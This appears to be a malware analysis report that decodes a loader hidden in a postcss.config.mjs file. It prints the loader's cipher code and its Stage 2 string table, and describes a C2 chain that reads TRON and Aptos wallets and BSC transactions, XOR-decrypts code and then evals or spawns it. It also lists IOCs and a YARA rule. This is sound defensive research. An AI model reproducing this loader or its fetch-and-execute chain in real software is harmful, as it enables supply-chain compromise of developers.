# Task M: `Cot%3t=shtP` Cipher Decode

**Date:** 2026-06-27  
**Task:** Decode Stage 2 payload from `Cot%3t=shtP` cipher wave (Mar–Apr 2026)  
**Source:** `herasoftlabs/ChainLab/postcss.config.mjs` (live sample)

---

## Summary

The `Cot%3t=shtP` wave (March–April 2026) uses the **identical C2 infrastructure** as the
current (`_$_b229`) wave: same TRON wallets, same Aptos fallback addresses, same BSC RPC
nodes. Only the campaign XOR keys changed between waves.

This confirms a single persistent C2 backend has operated continuously from at least
March 2026 through June 2026.

---

## Cipher Structure

Stage 0 IIFE (the outer `postcss.config.mjs` payload) structure:

```javascript
(function(){
  var VRG='', GhP=764-753;      // GhP=11
  function MDy(f){               // Shuffle cipher: seed=1111436, off=119/615, mod=13553/37182, modulus=3896884
    var r=1111436; var w=f.length; var h=[];
    for(var q=0;q<w;q++){h[q]=f.charAt(q)};
    for(var q=0;q<w;q++){
      var z=r*(q+119)+(r%13553); var i=r*(q+615)+(r%37182);
      var b=z%w; var c=i%w; var j=h[b]; h[b]=h[c]; h[c]=j; r=(z+i)%3896884;
    }; return h.join('')
  }
  var tgr=MDy('lcdmccutnorbjrothxgunkyepaivtswrsozqf').substr(0,GhP);  // → 'constructor'
  var ruc='...890-char encoded decompressor...';
  var oWZ=MDy[tgr];              // = Function constructor
  var kcL=''; var AoT=oWZ;
  var yus=oWZ(kcL,MDy(ruc));    // build decompressor fn from MDy-decoded ruc
  var quw=yus(MDy('i+]Pet...Cot%3t=shtP...2606-char encoded Stage 2...'));
  var tzo=AoT(VRG,quw);         // Function('', stage2_body)
  tzo(5471); return 3456;        // run Stage 2; activation=5471, sentinel=3456
})()
```

**Key parameters (cipher `MDy`):**

| Parameter | Value |
|-----------|-------|
| Seed (`r`) | **1111436** |
| Offset 1 | 119 |
| Offset 2 | 615 |
| Mod 1 | 13553 |
| Mod 2 | 37182 |
| Modulus | 3896884 |

The `Cot%3t=shtP` name comes from OSM identifying the cipher by the first visible chars of
the 2606-char encoded Stage 2 argument (before MDy decode). OSM found `Cot%3t=shtP` near the
start of the string and used it as the family identifier.

---

## Stage 2 String Table — `_$_4eb3` Decoded

Stage 2 embeds its own inline instance of the shuffle cipher (`_$af402005`), encoding a
53-entry string table:

```
[0]:  "r"                           ← global key for require()
[1]:  "end"
[2]:  "error"
[3]:  "on"
[4]:  ""                            ← empty string
[5]:  "data"
[6]:  "parse"
[7]:  "JSON"
[8]:  "get"
[9]:  "https"
[10]: "Promise"
[11]: "2.0"
[12]: "stringify"
[13]: "POST"
[14]: "request"
[15]: "write"
[16]: "join"
[17]: "reverse"
[18]: "split"
[19]: "utf8"
[20]: "toString"
[21]: "raw_data"                    ← TRON transaction field
[22]: "/transactions?only_confirmed=true&only_from=true&limit=1"  ← TRON API suffix
[23]: "hex"
[24]: "from"
[25]: "Buffer"
[26]: "arguments"                   ← Aptos response field
[27]: "payload"                     ← Aptos response field
[28]: "/transactions?limit=1"       ← Aptos API suffix
[29]: "?.?"                         ← BSC payload separator IOC
[30]: "substring"
[31]: "input"                       ← BSC tx field
[32]: "result"
[33]: "eth_getTransactionByHash"    ← BSC RPC method
[34]: "bsc-dataseed.binance.org"    ← BSC RPC primary
[35]: "bsc-rpc.publicnode.com"      ← BSC RPC fallback
[36]: "length"
[37]: "charCodeAt"
[38]: "fromCharCode"
[39]: "String"
[40]: "2[gWfGj;<:-93Z^C"           ← Campaign XOR key 1 (W1 channel)
[41]: "TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP"  ← TRON wallet W1
[42]: "0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e"  ← Aptos fallback 1
[43]: "m6:tTh^D)cBz?NM]"           ← Campaign XOR key 2 (W2 channel)
[44]: "TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG"  ← TRON wallet W2
[45]: "0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3"  ← Aptos fallback 2
[46]: "node"
[47]: "-e"
[48]: "_V"                          ← Campaign ID global key
[49]: "';"
[50]: "ignore"
[51]: "spawn"
[52]: "child_process"
```

---

## C2 Execution Chain

```
Stage 0 → Stage 2 (inline, Cot%3t=shtP)
                           ↓
  1. GET https://api.trongrid.io/v1/accounts/{TRON_wallet}/transactions?only_confirmed=true&only_from=true&limit=1
     → response.data[0].raw_data.data (hex string)
     → Buffer.from(..., 'hex').toString('utf8').split('').reverse().join('')
     → produces a BSC transaction hash (r)
                           ↓
  2. eth_getTransactionByHash(r) → bsc-dataseed.binance.org (POST)
     → result.input.substring(2) (strip '0x')
     → Buffer.from(..., 'hex').toString('utf8')
     → split('?.?')[1]
     → produces XOR-encrypted payload (n)
                           ↓
  3. XOR-decrypt n with campaign key (a):
     for each byte: output += chr(n[i] XOR key[i % len(key)])
     → produces Stage 3 JavaScript code
                           ↓
  4. eval(Stage 3)           (first channel: TMfKQEd7... wallet)
  5. child_process.spawn('node', ['-e', "global['_V']='<campaign_id>';<Stage 3>"])
     (second channel: TXfxHUet... wallet, with campaign ID injected)
```

The Aptos API is a fallback: if the TRON API call fails, the chain falls back to
`https://fullnode.mainnet.aptoslabs.com/v1/accounts/{aptos_addr}/transactions?limit=1`
and reads `response[0].payload.arguments[0]` instead of `raw_data.data`.

---

## Cross-Wave Infrastructure Comparison

| Field | `_$_1e42` (Jan–Mar) | `Cot%3t=shtP` (Mar–Apr) | `_$_b229` (Jun) |
|-------|---------------------|--------------------------|------------------|
| W1 TRON | TMfKQEd7... ✓ | **TMfKQEd7...** ✓ | TMfKQEd7... ✓ |
| W2 TRON | TXfxHUet... ✓ | **TXfxHUet...** ✓ | TXfxHUet... ✓ |
| Aptos 1 | 0xbe037400... ✓ | **0xbe037400...** ✓ | 0xbe037400... ✓ |
| Aptos 2 | 0x3f0e5781... ✓ | **0x3f0e5781...** ✓ | 0x3f0e5781... ✓ |
| BSC primary | bsc-dataseed.binance.org | bsc-dataseed.binance.org | bsc-dataseed.binance.org |
| BSC fallback | bsc-rpc.publicnode.com | bsc-rpc.publicnode.com | bsc-rpc.publicnode.com |
| BSC separator | `?.?` | **`?.?`** | `?.?` |
| Campaign key 1 | (not yet decoded) | `2[gWfGj;<:-93Z^C` | (from _$_b229 decode) |
| Campaign key 2 | (not yet decoded) | `m6:tTh^D)cBz?NM]` | (from _$_b229 decode) |
| require stored as | `global['!']` | **`global['r']`** | `global['r']` |
| Campaign ID key | `global['!']` | **`global['_V']`** | `global['_V']` |

**The TRON wallets, Aptos fallbacks, BSC endpoints, and `?.?` separator are identical across
all three wave generations (Jan–Jun 2026).** The same C2 backend has been in continuous
operation for at least 6 months.

---

## Global Marker Evolution

```
_$_1e42 wave (Jan–Mar 2026):
  require → global['!']
  campaign ID → global['!']   (same key — used for both)

Cot%3t=shtP wave (Mar–Apr 2026):  ← THIS TASK
  require → global['r']       (changed to single letter)
  campaign ID → global['_V']  (separated from require)

_$_b229 / NVu / Wrm (May–Jun 2026):
  require → global['r']       (maintained)
  campaign ID → global['_V']  (maintained, read via _$_9f51[0] → '_V')
```

The transition between `_$_1e42` and `Cot%3t=shtP` is the point where the actor:
1. Changed the global require key from `'!'` to `'r'`
2. Separated the campaign ID key to `'_V'`
3. Changed from a named variable cipher (`_$_1e42`) to an anonymous inner function (`MDy`)

These naming conventions established in the `Cot%3t=shtP` wave persisted through June 2026.

---

## Campaign Keys for TRON Wallet Lookup

The campaign keys are 16-char XOR keys used to decrypt the BSC-stored payload:

| Key | Value | Channel |
|-----|-------|---------|
| Key 1 | `"2[gWfGj;<:-93Z^C"` | W1 wallet (TMfKQEd7...) |
| Key 2 | `"m6:tTh^D)cBz?NM]"` | W2 wallet (TXfxHUet...) |

Format: 16 printable ASCII characters, appears random / pseudo-random, unique per campaign
wave. The TRON transaction hash stored in `raw_data.data` changes with each update cycle;
the XOR key is static for a given wave.

**If the current TRON wallet transactions include data from the March–April period,
querying `TMfKQEd7...` history and XOR-decrypting with `2[gWfGj;<:-93Z^C` would recover
that wave's Stage 3 payload.**

---

## IOCs (new from Task M)

```
# Cot%3t=shtP wave campaign XOR keys
"2[gWfGj;<:-93Z^C"     (W1 channel, TMfKQEd7 wallet)
"m6:tTh^D)cBz?NM]"    (W2 channel, TXfxHUet wallet)

# BSC separator (present in all waves — reliable YARA IOC)
"?.?"

# Global markers introduced in Cot%3t=shtP wave (persist to current)
global['r']   = require  (Node.js require stored in global)
global['_V']  = campaign ID

# Cipher parameters (MDy / _$af402005, embedded in Stage 2)
seed=1111436, off1=119, off2=615, mod1=13553, mod2=37182, modulus=3896884
```

---

## YARA Rule

```yara
rule PolinRider_Stage2_BSC_Separator {
    meta:
        description = "PolinRider Stage 2: BSC payload separator '?.?' present in all waves"
        author = "analysis2"
        date = "2026-06-27"
        reference = "Task M / Task G"
    strings:
        $sep     = "?.?" ascii
        $bsc1    = "bsc-dataseed.binance.org" ascii
        $bsc2    = "eth_getTransactionByHash" ascii
        $tron_w1 = "TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP" ascii
        $tron_w2 = "TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG" ascii
    condition:
        $sep and ($bsc1 or $bsc2) and ($tron_w1 or $tron_w2)
}
```

This rule would fire on any decoded Stage 2 payload across all known waves (Jan–Jun 2026).
